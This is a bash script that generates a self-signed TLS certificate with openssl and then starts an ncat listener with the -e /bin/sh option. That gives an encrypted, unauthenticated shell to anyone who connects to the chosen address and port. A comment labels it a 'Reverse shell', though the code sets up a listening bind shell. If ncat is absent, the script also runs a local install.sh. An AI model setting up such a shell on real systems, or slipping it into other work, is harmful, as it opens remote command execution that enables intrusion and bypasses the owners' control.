#!/bin/bash

usage() {
	echo "[x] usage:" >&2
	echo "  $0 <port>" >&2
	echo "  $0 <listenaddr> <port>" >&2

	exit 1
}


# Arguments
[[ -z "$1" ]] && usage
HOST=127.0.0.1
PORT=$1

if [[ ! -z "$2" ]]; then
	HOST=$PORT
	PORT=$2
fi

command -v ncat &>/dev/null || ./install.sh

CERTS=my
if [[ ! -d $CERTS ]]; then
	if [[ -e $CERTS ]]; then
		rm -rf $CERTS
		if [[ $? -ne 0 ]]; then 
			echo "[x] cannot create $CERTS directory"
			exit 2
		fi
	fi
	mkdir -p $CERTS
fi

CERT=cert.pem
KEY=privkey.pem
CSR=req.csr
MAKECERT=0
MAKEKEY=0

pushd $CERTS &>/dev/null
if [[ ! -f $CERT ]]; then
	MAKECERT=1
fi

if [[ ! -f $KEY ]]; then
	MAKECERT=1
	MAKEKEY=1
fi

if [[ $MAKEKEY -eq 1 ]]; then
	rm -rf $KEY
	openssl genrsa -out $KEY 2048
fi

if [[ $MAKECERT -eq 1 ]]; then
	openssl req -new -key $KEY -out $CSR -sha256
	openssl x509 -req -in $CSR -out $CERT -signkey $KEY -sha256
	rm -rf $CSR
fi
popd &>/dev/null


# Reverse shell!
ncat -l --ssl --ssl-cert $CERTS/$CERT --ssl-key $CERTS/$KEY -e /bin/sh $HOST $PORT
